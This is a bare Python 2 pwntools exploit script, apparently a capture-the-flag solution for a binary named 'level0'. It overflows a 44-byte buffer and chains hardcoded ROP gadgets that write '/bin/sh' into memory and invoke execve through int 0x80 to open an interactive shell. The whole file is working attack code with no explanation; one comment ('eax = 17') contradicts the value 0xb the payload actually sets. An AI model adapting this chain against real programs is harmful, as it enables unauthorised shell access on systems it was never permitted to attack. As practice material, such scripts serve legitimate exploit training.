from pwn import *


offset = 44
int80ret = p32(0x08052cf0)
popeax = p32(0x0806b893)
zeroeax = p32(0x08097bff)
moveaxedx = p32(0x0806fe6c)
popedx = p32(0x080525c6)
popecxebx = p32(0x080525ed)
movptredxeax = p32(0x08079191)
bss1 = p32(0x80cada0)
bss2 = p32(0x80cada4)
#eax = 17
#ebx = /bin/sh
#ecx = 0
#edx = 0
payload = "A"*offset + popedx + bss1 + popeax + "/bin" + movptredxeax + popedx + bss2 + popeax + "/sh\x00" + movptredxeax
payload += popedx + p32(0xb) + moveaxedx + popecxebx + p32(0) + bss1 + popedx + p32(0) + int80ret


p = process('./level0')

print p.recvline()

p.sendline(payload)
p.interactive()
